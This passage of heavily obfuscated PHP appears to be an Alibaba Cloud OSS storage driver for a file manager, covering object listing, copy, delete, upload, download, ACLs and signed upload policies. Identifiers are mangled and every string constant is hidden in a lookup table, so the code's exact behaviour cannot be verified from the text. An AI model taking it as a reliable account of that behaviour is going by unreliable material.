$»ÃäÚ->getPrefixList(); foreach ($¨å‘’Ìâ as $ëĞÕ²Ğ³) { if ($ëĞÕ²Ğ³->getKey() == $ä¢ªâäÁ) { continue; } $½ÊÈô¯õ = $ëĞÕ²Ğ³->getKey(); $À¥²¨Ìæ = $ëĞÕ²Ğ³->getSize(); $€ÕÑÆŠÓ = $ëĞÕ²Ğ³->getLastModified(); $çé„œÑé = trim($ëĞÕ²Ğ³->getETag(), $¡İ¥¦ïµ[119]); $ùßïá­ = $ÖŸÏ¿Ò ? array($¡İ¥¦ïµ[32] => $½ÊÈô¯õ, $¡İ¥¦ïµ[79] => $À¥²¨Ìæ, $¡İ¥¦ïµ[205] => strtotime($€ÕÑÆŠÓ), $¡İ¥¦ïµ[1634] => $çé„œÑé) : $½ÊÈô¯õ; $ñ…Íî— = $À¥²¨Ìæ == 0 && substr($½ÊÈô¯õ, strlen($½ÊÈô¯õ) - 1, 1) == $¡İ¥¦ïµ[8] ? !0 : !1; $†É“µÊ¬ = array($¡İ¥¦ïµ[79] => $À¥²¨Ìæ, $¡İ¥¦ïµ[1635] => $À¥²¨Ìæ, $¡İ¥¦ïµ[88] => strtotime($€ÕÑÆŠÓ), $¡İ¥¦ïµ[1636] => $€ÕÑÆŠÓ, $¡İ¥¦ïµ[1634] => $çé„œÑé); $this->cacheMethodInfoSet($½ÊÈô¯õ, $ñ…Íî—, $†É“µÊ¬); if ($ñ…Íî—) { $ùÄ…ÕÃä[] = $½ÊÈô¯õ; continue; } $†÷³ç™Ó[] = $ùßïá­; } foreach ($²Ğ¼ôÀ„ as $ğôŒÕòø) { $ùÄ…ÕÃä[] = $ğôŒÕòø->getPrefix(); $this->cacheMethodInfoSet($ğôŒÕòø->getPrefix(), !0); } if ($Ó’Ï¼¤” === $¡İ¥¦ïµ[12]) { break; } } $this->cacheMethodInfoSet($Ûë—…¹, !0); return array($¡İ¥¦ïµ[85] => $ùÄ…ÕÃä, $¡İ¥¦ïµ[86] => $†÷³ç™Ó); } public function listObject($¸ŠÜï ı, $¨¥”Û˜ = '') { $½´ûîíß =& $_SERVER[áäÒ½¯Ç]; $¸ŠÜï ı = trim($¸ŠÜï ı, $½´ûîíß[8]); $ê£ƒ­ = empty($¸ŠÜï ı) && $¸ŠÜï ı !== $½´ûîíß[239] ? $½´ûîíß[12] : $¸ŠÜï ı . $½´ûîíß[8]; $†€Éí‚ª = $½´ûîíß[12]; $‰¦£Œøæ = 1000; $¤«Ò·Ú = $…ÎôıòÅ = array(); while (!0) { check_abort(); $ï‘°—Íş = array($½´ûîíß[1630] => $¨¥”Û˜, $½´ûîíß[1631] => $ê£ƒ­, $½´ûîíß[1632] => $‰¦£Œøæ, $½´ûîíß[1633] => $†€Éí‚ª); try { $Ñï¨Ñ¹ß = $this->client->listObjects($this->bucket, $ï‘°—Íş); } catch (OSS\Core\OssException $ôĞ×’«) { $this->writeLog(__FUNCTION__ . $½´ûîíß[213] . $ôĞ×’«->getMessage()); break; } $†€Éí‚ª = $Ñï¨Ñ¹ß->getNextMarker(); $ãá°ëÊÄ = $Ñï¨Ñ¹ß->getObjectList(); foreach ($ãá°ëÊÄ as $ÌêÒ…ø´) { if ($ÌêÒ…ø´->getKey() == $ê£ƒ­) { continue; } $ØÚ¼ç¯× = $ÌêÒ…ø´->getKey(); $ ßñÆÅÑ = $ÌêÒ…ø´->getSize(); $Ì“´úÜ = $ ßñÆÅÑ == 0 && substr($ØÚ¼ç¯×, strlen($ØÚ¼ç¯×) - 1, 1) == $½´ûîíß[8] ? !0 : !1; if ($Ì“´úÜ) { continue; } $…ÎôıòÅ[] = $ ßñÆÅÑ . $½´ûîíß[213] . $ØÚ¼ç¯×; } if ($†€Éí‚ª === $½´ûîíß[12]) { break; } } return array($½´ûîíß[85] => $¤«Ò·Ú, $½´ûîíß[86] => $…ÎôıòÅ); } public function copyFile($œÑø¼§š, $èèˆûìí) { $¼ ËëÅ = $this->size($œÑø¼§š); if ($¼ ËëÅ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $œÑø¼§š, $this->bucket, $this->pathEncode($èèˆûìí)); } catch (OSS\Core\OssException $í›ò…Ó) { $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][213] . $í›ò…Ó->getMessage()); return !1; } return $this->getPathOuter($èèˆûìí); } $ëŒÖ‹Æ« = $this->multiCopyObject($œÑø¼§š, $èèˆûìí, $¼ ËëÅ); return $ëŒÖ‹Æ« ? $this->getPathOuter($èèˆûìí) : !1; } private function multiCopyObject($ÄúŞÒ², $³ƒ¦”Á, $úÄ®Á‹µ) { $ æ·ÔÄ¥ =& $_SERVER[áäÒ½¯Ç]; try { $­§ÕÈæ« = array(); if ($Åß²ÒúÃ = $this->hashMd5($ÄúŞÒ²)) { $­§ÕÈæ« = array(OSS\OssClient::OSS_HEADERS => array($ æ·ÔÄ¥[1637] => $Åß²ÒúÃ)); } $¶¾«øî = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($³ƒ¦”Á), $­§ÕÈæ«); $ñ—åç  = 1; $ü©ûßŠÅ = 0; $¡ê­— = array(); $Ô˜òùüû = 1024 * 1024 * 10; $ªŞĞù›â = $this->client->generateMultiuploadParts($úÄ®Á‹µ, $Ô˜òùüû); foreach ($ªŞĞù›â as $ç—ëŒ¶ => $ã‡ ¤ÍÎ) { $úå›Û‹’ = $ü©ûßŠÅ + (int) $ã‡ ¤ÍÎ[$ æ·ÔÄ¥[1638]]; $ÌÉ¿È¸õ = (int) $ã‡ ¤ÍÎ[$ æ·ÔÄ¥[422]] + $úå›Û‹’ - 1; $ªãêíæ = array($ æ·ÔÄ¥[165] => $úå›Û‹’, $ æ·ÔÄ¥[166] => $ÌÉ¿È¸õ); $¡ê­—[] = $this->client->uploadPartCopy($this->bucket, $ÄúŞÒ², $this->bucket, $this->pathEncode($³ƒ¦”Á), $ñ—åç , $¶¾«øî, $ªãêíæ); $ñ—åç  = $ñ—åç  + 1; } $¤ÍÏÃÔÈ = array(); foreach ($¡ê­— as $ç—ëŒ¶ => $¥¤§û–ü) { $¤ÍÏÃÔÈ[] = array($ æ·ÔÄ¥[307] => $ç—ëŒ¶ + 1, $ æ·ÔÄ¥[308] => $¥¤§û–ü); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($³ƒ¦”Á), $¶¾«øî, $¤ÍÏÃÔÈ); } catch (OSS\Core\OssException $óØ£“ùÆ) { $this->writeLog(__FUNCTION__ . $ æ·ÔÄ¥[213] . $óØ£“ùÆ->getMessage()); return !1; } return !0; } public function moveFile($ÜÎ…ÂÈ, $¨ÁÁ›È) { if ($this->copyFile($ÜÎ…ÂÈ, $¨ÁÁ›È)) { $this->remove($ÜÎ…ÂÈ); return $this->getPathOuter($¨ÁÁ›È); } return !1; } public function delFile($¹Ó’£şĞ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¹Ó’£şĞ)); } catch (OSS\Core\OssException $ºİùİ±ì) { $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][213] . $ºİùİ±ì->getMessage()); return !1; } return !0; } public function delFolder($æïàµƒá) { $¹ØıÓ±ë =& $_SERVER[áäÒ½¯Ç]; if (!$this->exist($æïàµƒá)) { return !0; } $this->listItemCache = !1; $î°ò…¾ç = $this->fileList($æïàµƒá); $this->listItemCache = !0; $Ã÷Ù¿Æ = trim($æïàµƒá, $¹ØıÓ±ë[8]) . $¹ØıÓ±ë[8]; if (!empty($æïàµƒá) && $æïàµƒá !== $¹ØıÓ±ë[239] && !in_array($Ã÷Ù¿Æ, $î°ò…¾ç[$¹ØıÓ±ë[85]])) { $î°ò…¾ç[$¹ØıÓ±ë[85]][] = $Ã÷Ù¿Æ; } $ç€ÂÒ˜Œ = $this->delByBatch($î°ò…¾ç[$¹ØıÓ±ë[86]]); if (!$ç€ÂÒ˜Œ) { return !1; } $ç€ÂÒ˜Œ = $this->delByBatch($î°ò…¾ç[$¹ØıÓ±ë[85]]); if (!$ç€ÂÒ˜Œ) { return !1; } return $this->delFile($Ã÷Ù¿Æ); } private function delByBatch($à¿‘– É) { foreach (array_chunk($à¿‘– É, 1000) as $Í¹Ñ¥û€) { try { $this->client->deleteObjects($this->bucket, $Í¹Ñ¥û€); } catch (OSS\Core\OssException $÷Í››Å‡) { $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][213] . $÷Í››Å‡->getMessage()); return !1; } } return !0; } public function rename($‹‘§•ş‡, $èã—¬Ğ†) { return $this->renameObject($‹‘§•ş‡, $èã—¬Ğ†); } private function fileInfo($×ŞÃ¢Ù¾, $åì¬Ë°ç = false, $ĞÍüÛã© = array()) { $ÚµâĞÇ =& $_SERVER[áäÒ½¯Ç]; $„½à ¼› = array($ÚµâĞÇ[32] => $this->pathThis($×ŞÃ¢Ù¾), $ÚµâĞÇ[87] => $this->getPathOuter($×ŞÃ¢Ù¾), $ÚµâĞÇ[33] => $ÚµâĞÇ[241], $ÚµâĞÇ[79] => isset($ĞÍüÛã©[$ÚµâĞÇ[79]]) ? $ĞÍüÛã©[$ÚµâĞÇ[79]] : 0, $ÚµâĞÇ[167] => $this->ext($×ŞÃ¢Ù¾)); if ($åì¬Ë°ç) { return $„½à ¼›; } $„½à ¼›[$ÚµâĞÇ[242]] = $„½à ¼›[$ÚµâĞÇ[88]] = 0; $„½à ¼›[$ÚµâĞÇ[243]] = $„½à ¼›[$ÚµâĞÇ[244]] = !0; if (empty($ĞÍüÛã©)) { $ÈÔÙû‘Â = $this->objectMeta($×ŞÃ¢Ù¾); if (!$ÈÔÙû‘Â) { return $„½à ¼›; } $ĞÍüÛã© = array($ÚµâĞÇ[88] => strtotime($ÈÔÙû‘Â[$ÚµâĞÇ[1636]]), $ÚµâĞÇ[79] => $ÈÔÙû‘Â[$ÚµâĞÇ[1635]] + 0, $ÚµâĞÇ[1634] => $ÈÔÙû‘Â[$ÚµâĞÇ[1634]]); } if (isset($ĞÍüÛã©[$ÚµâĞÇ[1634]]) && $ĞÍüÛã©[$ÚµâĞÇ[1634]]) { $„½à ¼›[$ÚµâĞÇ[246]] = trim($ĞÍüÛã©[$ÚµâĞÇ[1634]], $ÚµâĞÇ[119]); } if (isset($ĞÍüÛã©[$ÚµâĞÇ[79]])) { $„½à ¼›[$ÚµâĞÇ[79]] = $ĞÍüÛã©[$ÚµâĞÇ[79]]; } if (isset($ĞÍüÛã©[$ÚµâĞÇ[88]])) { $„½à ¼›[$ÚµâĞÇ[88]] = $ĞÍüÛã©[$ÚµâĞÇ[88]]; } if (isset($ĞÍüÛã©[$ÚµâĞÇ[205]]) && !trim($„½à ¼›[$ÚµâĞÇ[88]])) { $„½à ¼›[$ÚµâĞÇ[88]] = $ĞÍüÛã©[$ÚµâĞÇ[205]]; } return $„½à ¼›; } private function folderInfo($á¿™•¢³, $ºÒ™’ú = false, $—’‡äŒŞ = array()) { $ŞñÎÀİÑ =& $_SERVER[áäÒ½¯Ç]; $’·éû˜ô = array($ŞñÎÀİÑ[32] => $this->pathThis($á¿™•¢³), $ŞñÎÀİÑ[87] => $this->getPathOuter($ŞñÎÀİÑ[8] . $á¿™•¢³), $ŞñÎÀİÑ[33] => $ŞñÎÀİÑ[78]); if ($ºÒ™’ú) { return $’·éû˜ô; } $’·éû˜ô[$ŞñÎÀİÑ[242]] = $’·éû˜ô[$ŞñÎÀİÑ[88]] = 0; $’·éû˜ô[$ŞñÎÀİÑ[243]] = $’·éû˜ô[$ŞñÎÀİÑ[244]] = !0; if (empty($—’‡äŒŞ)) { $á¿™•¢³ = rtrim($á¿™•¢³, $ŞñÎÀİÑ[8]) . $ŞñÎÀİÑ[8]; $Øö·Ó¢ = $this->objectMeta($á¿™•¢³); if (!$Øö·Ó¢) { return $’·éû˜ô; } $—’‡äŒŞ = array($ŞñÎÀİÑ[242] => $Øö·Ó¢[$ŞñÎÀİÑ[600]][$ŞñÎÀİÑ[1639]], $ŞñÎÀİÑ[88] => strtotime($Øö·Ó¢[$ŞñÎÀİÑ[1636]])); } if (isset($—’‡äŒŞ[$ŞñÎÀİÑ[88]])) { $’·éû˜ô[$ŞñÎÀİÑ[88]] = $—’‡äŒŞ[$ŞñÎÀİÑ[88]]; } if (isset($—’‡äŒŞ[$ŞñÎÀİÑ[242]])) { $’·éû˜ô[$ŞñÎÀİÑ[242]] = $—’‡äŒŞ[$ŞñÎÀİÑ[242]]; } return $’·éû˜ô; } public function listPath($ ÑÆ“ëŞ, $ãÅù‹… = false) { $È…ÅíÊ =& $_SERVER[áäÒ½¯Ç]; $—¿şÕˆ¸ = $this->fileList($ ÑÆ“ëŞ, $È…ÅíÊ[8], !0); foreach ($—¿şÕˆ¸[$È…ÅíÊ[85]] as $°×ùñ¿’ => $Û«½ã®) { $—¿şÕˆ¸[$È…ÅíÊ[85]][$°×ùñ¿’] = $this->folderInfo($Û«½ã®, $ãÅù‹…, $Û«½ã®); } foreach ($—¿şÕˆ¸[$È…ÅíÊ[86]] as $°×ùñ¿’ => $Û«½ã®) { $—¿şÕˆ¸[$È…ÅíÊ[86]][$°×ùñ¿’] = $this->fileInfo($Û«½ã®[$È…ÅíÊ[32]], $ãÅù‹…, $Û«½ã®); } return $—¿şÕˆ¸; } protected function infoChildren($šôÁ´Ùê, &$éñ«”ã) { $¨‚”ãõö =& $_SERVER[áäÒ½¯Ç]; $Ü‡üÉ«Ä = $this->fileList($šôÁ´Ùê, $¨‚”ãõö[12], !0); $éñ«”ã[$¨‚”ãõö[81]] += count($Ü‡üÉ«Ä[$¨‚”ãõö[85]]); $éñ«”ã[$¨‚”ãõö[80]] += count($Ü‡üÉ«Ä[$¨‚”ãõö[86]]); foreach ($Ü‡üÉ«Ä[$¨‚”ãõö[86]] as $¨â´ĞÛş) { if (!$¨â´ĞÛş || !$¨â´ĞÛş[$¨‚”ãõö[79]]) { continue; } $éñ«”ã[$¨‚”ãõö[79]] += $¨â´ĞÛş[$¨‚”ãõö[79]]; } } public function has($ß–°Â¤“, $ûÂ¼–ç¾ = false, $ãˆ€ºÊñ = true) { $îµ¸äÒ” =& $_SERVER[áäÒ½¯Ç]; $ß–°Â¤“ = trim($ß–°Â¤“, $îµ¸äÒ”[8]); $È×ìŠËù = empty($ß–°Â¤“) && $ß–°Â¤“ !== $îµ¸äÒ”[239] ? $îµ¸äÒ”[12] : $ß–°Â¤“ . $îµ¸äÒ”[8]; $À†ššæ = $îµ¸äÒ”[12]; $‚È˜Ø“Ï = 500; $µóœİÃÓ = $¼¢»ÈºÈ = 0; while (!0) { check_abort(); $›Ÿ³Ÿò = array($îµ¸äÒ”[1630] => $îµ¸äÒ”[8], $îµ¸äÒ”[1631] => $È×ìŠËù, $îµ¸äÒ”[1632] => $‚È˜Ø“Ï, $îµ¸äÒ”[1633] => $À†ššæ); try { $ÕÒÉÓ‚Õ = $this->client->listObjects($this->bucket, $›Ÿ³Ÿò); } catch (OSS\Core\OssException $»Ï¡™®ë) { $this->writeLog(__FUNCTION__ . $îµ¸äÒ”[213] . $»Ï¡™®ë->getMessage()); break; } $À†ššæ = $ÕÒÉÓ‚Õ->getNextMarker(); $íˆ÷¥¾¦ = $ÕÒÉÓ‚Õ->getObjectList(); $»”ùâÏ¥ = $ÕÒÉÓ‚Õ->getPrefixList(); if ($ûÂ¼–ç¾) { if (count($íˆ÷¥¾¦) > 1 || count($íˆ÷¥¾¦) == 1 && $íˆ÷¥¾¦[0]->getKey() != $È×ìŠËù) { $µóœİÃÓ += count($íˆ÷¥¾¦) - 1; } if (!empty($»”ùâÏ¥)) { $¼¢»ÈºÈ += count($»”ùâÏ¥); } if ($À†ššæ === $îµ¸äÒ”[12]) { break; } continue; } if ($ãˆ€ºÊñ) { if (!empty($íˆ÷¥¾¦)) { if (count($íˆ÷¥¾¦) > 1 || $íˆ÷¥¾¦[0]->getKey() != $È×ìŠËù) { return !0; } } } else { if (!empty($»”ùâÏ¥)) { return !0; } } if ($À†ššæ === $îµ¸äÒ”[12]) { break; } } if ($ûÂ¼–ç¾) { return array($îµ¸äÒ”[250] => $µóœİÃÓ, $îµ¸äÒ”[251] => $¼¢»ÈºÈ); } return !1; } public function listAll($¸ÏıÅ¥) { $Ûû½Šå =& $_SERVER[áäÒ½¯Ç]; $ÆÍ··¡Ì = $this->fileList($¸ÏıÅ¥, $Ûû½Šå[12], !0); $ÓĞ‡ô§Ñ = array_to_keyvalue($ÆÍ··¡Ì[$Ûû½Šå[86]], $Ûû½Šå[32]); foreach ($ÆÍ··¡Ì[$Ûû½Šå[85]] as $ƒèÔãË­) { if (is_string($ƒèÔãË­)) { $ÓĞ‡ô§Ñ[$ƒèÔãË­] = array($Ûû½Šå[79] => 0); } } return $this->listAllFiles($¸ÏıÅ¥, $ÓĞ‡ô§Ñ); } public function canRead($ïÖëš¸ï) { $§‚èË´ë =& $_SERVER[áäÒ½¯Ç]; $„˜îÛ = $this->pathAcl($ïÖëš¸ï); return $„˜îÛ == $§‚èË´ë[1640] || $„˜îÛ == $§‚èË´ë[647] ? !0 : !1; } public function canWrite($½ù¼º£µ) { $õˆäàıÇ = $this->pathAcl($½ù¼º£µ); return $õˆäàıÇ == $_SERVER[áäÒ½¯Ç][647] ? !0 : !1; } public function pathAcl($¯­İ–ÖÔ) { $âáÃ¬›Ü =& $_SERVER[áäÒ½¯Ç]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÉºÛş–· = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¯­İ–ÖÔ)); } catch (OSS\Core\OssException $ËÃ¹øÚ) { $this->writeLog(__FUNCTION__ . $âáÃ¬›Ü[213] . $ËÃ¹øÚ->getMessage()); return !1; } $ˆ‹Ç£Âİ = $ÉºÛş–· == $âáÃ¬›Ü[37] ? $this->bucketAcl : $ÉºÛş–·; if ($ˆ‹Ç£Âİ == $âáÃ¬›Ü[1641]) { return $âáÃ¬›Ü[1640]; } if ($ˆ‹Ç£Âİ == $âáÃ¬›Ü[1642]) { return $âáÃ¬›Ü[647]; } return $ˆ‹Ç£Âİ; } private function chmodPath($Šı·Ú’, $…éâÚÓå = '') { $©ÚùáÛ› =& $_SERVER[áäÒ½¯Ç]; $ÅØöøµÕ = empty($…éâÚÓå) ? $©ÚùáÛ›[1642] : $…éâÚÓå; $ş®ıº¨“ = array($©ÚùáÛ›[37], $©ÚùáÛ›[240], $©ÚùáÛ›[1641], $©ÚùáÛ›[1642]); if (!in_array($ÅØöøµÕ, $ş®ıº¨“)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Šı·Ú’), $ÅØöøµÕ); } catch (OSS\Core\OssException $ÊºÑö±) { $this->writeLog(__FUNCTION__ . $©ÚùáÛ›[213] . $ÊºÑö±->getMessage()); return !1; } return !0; } public function getContent($‘ÅÏ¦à†) { return $this->fileSubstr($‘ÅÏ¦à†, -1); } public function setContent($ÈÕğ‘½©, $Àã¼ÌÜ = '') { $Á´¦¶¼¿ =& $_SERVER[áäÒ½¯Ç]; try { $¿Ç‡ËŸ“ = $this->trafficLimit($Á´¦¶¼¿[1643]); $µğïĞçÌ = $this->client->putObject($this->bucket, $this->pathEncode($ÈÕğ‘½©), $Àã¼ÌÜ, $¿Ç‡ËŸ“); } catch (OSS\Core\OssException $Ëó·’Ì) { $this->writeLog(__FUNCTION__ . $Á´¦¶¼¿[213] . $Ëó·’Ì->getMessage()); return !1; } $®®˜–›ı = array($Á´¦¶¼¿[1637] => trim($µğïĞçÌ[$Á´¦¶¼¿[1634]], $Á´¦¶¼¿[119]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÈÕğ‘½©))); $this->updateObjMeta($ÈÕğ‘½©, $®®˜–›ı); return isset($µğïĞçÌ[$Á´¦¶¼¿[1644]][$Á´¦¶¼¿[304]]) ? !0 : !1; } private function updateObjMeta($„‚âëÆ, $„ñÚË•) { $„‚âëÆ = $this->pathEncode($„‚âëÆ); try { $÷ñ‹²ãç = array(OSS\OssClient::OSS_HEADERS => $„ñÚË•); $this->client->copyObject($this->bucket, $„‚âëÆ, $this->bucket, $„‚âëÆ, $÷ñ‹²ãç); } catch (OSS\Core\OssException $Ë™ ÓÜƒ) { $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][213] . $Ë™ ÓÜƒ->getMessage()); return !1; } return !0; } public function upload($ğÃøˆÊ, $ĞöäŸÌù, $§ğôñ¥ = false, $Á…×çÄ² = REPEAT_REPLACE) { $ë¹Ûº±Œ =& $_SERVER[áäÒ½¯Ç]; if (!$ĞöäŸÌù || !@file_exists($ĞöäŸÌù)) { return !1; } $Ã•ğ¨ÆÈ = trim($ğÃøˆÊ, $ë¹Ûº±Œ[8]); $à«ÂÓ¹Ç = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ë¹Ûº±Œ[1637] => @md5_file($ĞöäŸÌù)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ğÃøˆÊ))); $à«ÂÓ¹Ç = $this->trafficLimit($ë¹Ûº±Œ[1643], $à«ÂÓ¹Ç); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Ã•ğ¨ÆÈ), $ĞöäŸÌù, $à«ÂÓ¹Ç); } catch (OSS\Core\OssException $ËÊö±•ë) { $this->writeLog(__FUNCTION__ . $ë¹Ûº±Œ[213] . $ËÊö±•ë->getMessage()); return !1; } return $this->getPathOuter($ğÃøˆÊ); } public function getHost() { $¿¤Û±‡ =& $_SERVER[áäÒ½¯Ç]; $¥éÓäÓÖ = explode($¿¤Û±‡[209], parent::getHost()); return $¥éÓäÓÖ[0] . $¿¤Û±‡[209] . $this->bucket . $¿¤Û±‡[10] . $¥éÓäÓÖ[1]; } public function uploadFormData($î¬Éê÷, $ş‡öˆœ¬ = 3600) { $’—¿Ñ¿ =& $_SERVER[áäÒ½¯Ç]; if (!($¸ºÑÁ‹Ö = $this->getHost())) { return !1; } $½¥Âóß = $ş‡öˆœ¬; $È–¸õò„ = date($’—¿Ñ¿[1645], time() + $½¥Âóß); $¹ªÉâ¹ = new DateTime($È–¸õò„); $ì·‘š‰ı = $¹ªÉâ¹->format(DateTime::ISO8601); $ĞİÌÀî± = strpos($ì·‘š‰ı, $’—¿Ñ¿[381]); $ì·‘š‰ı = substr($ì·‘š‰ı, 0, $ĞİÌÀî±) . $’—¿Ñ¿[1646]; $òË¡úø£ = 1048576000 * 5; $½¤Ä©¢ø = $this->pathFather($î¬Éê÷); $¯ÆÃ—Ğí = array($’—¿Ñ¿[273] => $ì·‘š‰ı, $’—¿Ñ¿[276] => array(array($’—¿Ñ¿[1647], 0, $òË¡úø£), array($’—¿Ñ¿[278], $’—¿Ñ¿[279], $½¤Ä©¢ø))); $œŒ¡¸À = base64_encode(json_encode($¯ÆÃ—Ğí)); $†¤°Ã¬µ = base64_encode(hash_hmac($’—¿Ñ¿[1473], $œŒ¡¸À, $this->secret, !0)); $ë’æöë˜ = array($’—¿Ñ¿[1648] => $this->accessKey, $’—¿Ñ¿[288] => $œŒ¡¸À, $’—¿Ñ¿[281] => $’—¿Ñ¿[272], $’—¿Ñ¿[1649] => $†¤°Ã¬µ, $’—¿Ñ¿[207] => $¸ºÑÁ‹Ö); $ë’æöë˜ = $this->trafficLimit($’—¿Ñ¿[1643], $ë’æöë˜, !0); return $ë’æöë˜; } public function uploadMultiData($¨á§¦Š½, $ÅÈ¢·Ş = 3600) { $æ›Ò¾† =& $_SERVER[áäÒ½¯Ç]; if (!($Ÿİ·êˆÅ = $this->getHost())) { return !1; } $ÄŒæö¡© = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¨á§¦Š½)); return array($æ›Ò¾†[292] => $ÄŒæö¡©, $æ›Ò¾†[207] => $Ÿİ·êˆÅ . $æ›Ò¾†[8] . $this->pathEncode($¨á§¦Š½), $æ›Ò¾†[293] => gmdate($æ›Ò¾†[1650]), $æ›Ò¾†[95] => $¨á§¦Š½); } public function uploadMultiAuth($ŸãíŸ–», $òÂÉí÷¡ = array()) { if (isset($òÂÉí÷¡[$_SERVER[áäÒ½¯Ç][294]])) { return $this->uploadPartAuth($ŸãíŸ–», $òÂÉí÷¡); } return $this->uploadListAuth($ŸãíŸ–», $òÂÉí÷¡); } private function uploadPartAuth($¨£¡ÜÒí, $¢êÔ² = array()) { $ÛØ½¼õ  =& $_SERVER[áäÒ½¯Ç]; $¯Ù£¡Ø¿ = $¢êÔ²[$ÛØ½¼õ [95]]; $‡º§Ì•ù = $this->_getUploadAuth($¯Ù£¡Ø¿, $¢êÔ²); $îâ†·æ  = array($ÛØ½¼õ [296] => $‡º§Ì•ù[$ÛØ½¼õ [296]], $ÛØ½¼õ [293] => $‡º§Ì•ù[$ÛØ½¼õ [293]]); if (isset($‡º§Ì•ù[$ÛØ½¼õ [1651]])) { $îâ†·æ [$ÛØ½¼õ [1651]] = $‡º§Ì•ù[$ÛØ½¼õ [1651]]; } return $îâ†·æ ; } private function uploadListAuth($øïÇÊÍñ, $Å± ¸†Ô = array()) { $¶®ò˜×Á =& $_SERVER[áäÒ½¯Ç]; $º¯úîİŞ = $Å± ¸†Ô[$¶®ò˜×Á[95]]; $¤œ‡ÓÙ€ = $Å± ¸†Ô[$¶®ò˜×Á[292]]; $»Ş¥šò… = $this->client->listParts($this->bucket, $this->pathEncode($º¯úîİŞ), $¤œ‡ÓÙ€); $ïö‹ôıÛ = $»Ş¥šò…->getListPart(); $­×¤½šş = array(); foreach ($ïö‹ôıÛ as $Ê•Šª†Û) { $­×¤½šş[] = array($¶®ò˜×Á[307] => $Ê•Šª†Û->getPartNumber(), $¶®ò˜×Á[308] => trim($Ê•Šª†Û->getETag(), $¶®ò˜×Á[119])); } if (!$­×¤½šş) { return !1; } $ûŒ…†¡Î = $this->_getUploadAuth($º¯úîİŞ, $Å± ¸†Ô); return array($¶®ò˜×Á[296] => $ûŒ…†¡Î[$¶®ò˜×Á[296]], $¶®ò˜×Á[293] => $ûŒ…†¡Î[$¶®ò˜×Á[293]], $¶®ò˜×Á[299] => $­×¤½šş); } private function _getUploadAuth($Ï‚ŒÜâ®, $—ãĞÇ˜«) { $ìÄö¿ =& $_SERVER[áäÒ½¯Ç]; $˜ìÓ’ = gmdate($ìÄö¿[1650]); $‚×ï­ = isset($—ãĞÇ˜«[$ìÄö¿[294]]) ? $ìÄö¿[264] : $ìÄö¿[298]; $áÄË«ğ½ = array_intersect_key($—ãĞÇ˜«, array_flip(array($ìÄö¿[294], $ìÄö¿[292]))); ksort($áÄË«ğ½); $ìÆÆ“ä‡ = $áÄË«ğ½ ? $ìÄö¿[76] . http_build_query($áÄË«ğ½, null, $ìÄö¿[295], PHP_QUERY_RFC3986) : $ìÄö¿[12]; $È›Àüªö = array($‚×ï­, $ìÄö¿[12], $ìÄö¿[121], $˜ìÓ’, "\170\55\157\x73\x73\x2d\144\x61\164\145\72{$˜ìÓ’}", $ìÄö¿[8] . $this->bucket . $ìÄö¿[8] . $Ï‚ŒÜâ® . $ìÆÆ“ä‡); if (isset($—ãĞÇ˜«[$ìÄö¿[294]])) { $Ïß†† = $this->trafficLimit($ìÄö¿[1643], array(), !0); if ($Ïß††) { $Ï‚ŒÜâ® = $ìÄö¿[1651]; array_splice($È›Àüªö, 5, 0, $Ï‚ŒÜâ® . $ìÄö¿[4] . $Ïß††[$Ï‚ŒÜâ®]); } } $˜«ëÚñ = implode($ìÄö¿[221], $È›Àüªö); $¡é¤öÇª = base64_encode(hash_hmac($ìÄö¿[1473], $˜«ëÚñ, $this->secret, !0)); $§¶Î¬‹Ì = $ìÄö¿[1620] . $this->accessKey . $ìÄö¿[4] . $¡é¤öÇª; $¬û…öÇ« = array($ìÄö¿[296] => $§¶Î¬‹Ì, $ìÄö¿[293] => $˜ìÓ’); if (!empty($Ïß††)) { $¬û…öÇ« = array_merge($¬û…öÇ«, $Ïß††); } return $¬û…öÇ«; } public function download($ä¨·Ã™ˆ, $óÒƒ’¬‹) { $«„ÅÎÌı =& $_SERVER[áäÒ½¯Ç]; if ($this->isFolder($ä¨·Ã™ˆ)) { return !1; } try { $åæ÷ö©ë = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $óÒƒ’¬‹); $åæ÷ö©ë = $this->trafficLimit($«„ÅÎÌı[110], $åæ÷ö©ë); $this->client->getObject($this->bucket, $this->pathEncode($ä¨·Ã™ˆ), $åæ÷ö©ë); } catch (OSS\Core\OssException $¹”ãıçÜ) { $this->writeLog(__FUNCTION__ . $«„ÅÎÌı[213] . $¹”ãıçÜ->getMessage()); return !1; } return $óÒƒ’¬‹; } public function fileSubstr($ƒ¯ÑË, $¤‰¼ÅÁ = 0, $¬òşæÁè = false) { if ($¤‰¼ÅÁ === -1) { $‡Ëóï¹î = array(); } else { if ($¬òşæÁè === !1) { $’ıÍ…äó = $this->size($ƒ¯ÑË); } else { $’ıÍ…äó = $¤‰¼ÅÁ + $¬òşæÁè - 1; } $‡Ëóï¹î = array(OSS\OssClient::OSS_RANGE => "{$¤‰¼ÅÁ}\x2d{$’ıÍ…äó}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ƒ¯ÑË), $‡Ëóï¹î); } catch (OSS\Core\OssException $ÒåÇ—äÈ) { $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][213] . $ÒåÇ—äÈ->getMessage()); think_exception($ÒåÇ—äÈ->getMessage()); return !1; } } private function trafficLimit($ùíš¾ıæ, $ï÷Ôå·º = array(), $×ˆıüö = false) { $Ä³ãõÙ =& $_SERVER[áäÒ½¯Ç]; if ($ùíš¾ıæ == 